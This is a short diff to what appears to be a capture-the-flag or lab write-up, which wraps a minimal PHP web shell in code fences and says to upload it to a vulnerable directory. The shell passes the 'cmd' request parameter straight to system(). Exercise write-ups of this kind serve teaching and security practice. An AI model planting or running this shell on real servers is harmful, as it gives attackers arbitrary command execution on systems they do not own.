@@ -14,11 +14,13 @@ flag.txt home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var $
 
 ## Web Shell
 
+```php
 <?php
 if (isset($_GET['cmd'])) {
     system($_GET['cmd']);
 }
 ?>
+```
 
 Upload it to the vulnearble directory
 
